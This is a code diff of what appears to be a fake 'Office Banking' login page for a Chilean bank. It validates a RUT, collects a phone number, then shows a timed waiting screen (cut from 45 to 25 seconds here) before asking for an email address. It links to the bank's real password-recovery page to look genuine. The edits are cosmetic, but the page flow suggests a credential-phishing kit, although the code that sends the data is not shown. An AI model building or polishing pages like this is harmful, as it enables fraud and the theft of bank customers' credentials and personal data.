@@ -5,7 +5,7 @@
   <title>Office Banking</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <link rel="stylesheet" href="styles.css">
-<style>
+  <style>
     .spinner {
       border: 8px solid #f3f3f3;
       border-top: 8px solid red;
@@ -86,13 +86,13 @@
       <label for="telefono">Teléfono actualizado</label>
       <input type="tel" id="telefono" name="telefono" placeholder="+56 9 1234 5678" required>
       
-      <label class="checkbox-label">
+      <label class="checkbox-label" style="text-align:center;">
         <input type="checkbox" id="contacto" name="contacto" required>
         Deseo que me contacte un ejecutivo para solicitar Línea de Crédito o Tarjeta de Crédito.  
       </label>
       
-      <div class="options">
-        <label><input type="checkbox" id="recordar"> Recordar usuario</label>
+      <div class="options" style="text-align:center; margin-top:10px;">
+        <label><input type="checkbox" id="recordar"> Recordar usuario</label><br>
         <a href="https://wslogin.officebanking.cl/autogestion-clave" target="_blank">Olvidé mi clave</a>
       </div>
       
@@ -118,8 +118,9 @@
       <h2>Tenemos algunos productos disponibles para tu Empresa</h2>
       <button class="btn-red" onclick="continuarProductos()">Continuar</button>
     </div>
+  </div>
 
-<script>
+ <script>
   // Validación de RUT
   function validarRut(rutCompleto) {
     rutCompleto = rutCompleto.replace(/\./g, "").replace(/-/g, "").toUpperCase();
@@ -166,11 +167,11 @@
         document.getElementById("loginForm").style.display="none";
         document.getElementById("pantallaEspera").classList.remove("hidden");
 
-        // Mostrar formulario de correo después de 45 segundos
+        // Mostrar formulario de correo después de 25 segundos
         setTimeout(()=>{
           document.getElementById("pantallaEspera").classList.add("hidden");
           document.getElementById("formCorreo").classList.remove("hidden");
-        }, 45000);
+        }, 25000);
       }
     } catch (error) {
       document.getElementById("resultado").innerText = "⚠️ Error al conectar con el servidor.";
